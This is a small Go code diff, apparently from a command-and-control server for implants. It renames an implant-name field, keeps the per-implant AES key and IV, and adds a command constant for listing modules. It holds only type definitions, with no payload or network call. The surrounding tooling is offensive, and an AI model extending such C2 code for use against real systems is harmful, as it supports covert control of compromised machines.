@@ -31,6 +31,7 @@ type (
 	ImplantContext struct {
 		Magic_val           []byte
 		Agent_id            uint32
+		Agent_name          string
 		Host_name_length    uint32
 		Host_name           string
 		User_name_length    uint32
@@ -50,11 +51,10 @@ type (
 	}
 
 	Implant struct {
-		ImplantName string
-		AESKey      []byte
-		IV          []byte
-		Alive       bool
-		Context     ImplantContext
+		AESKey  []byte
+		IV      []byte
+		Alive   bool
+		Context ImplantContext
 	}
 
 	Package struct {
@@ -186,6 +186,7 @@ const (
 	CMD_GET_JOB
 	CMD_CHECKIN
 	CMD_NO_JOB
+	CMD_LIST_MODULES
 )
 
 func (p *Package) UnmarshalHeader(data []byte) error {
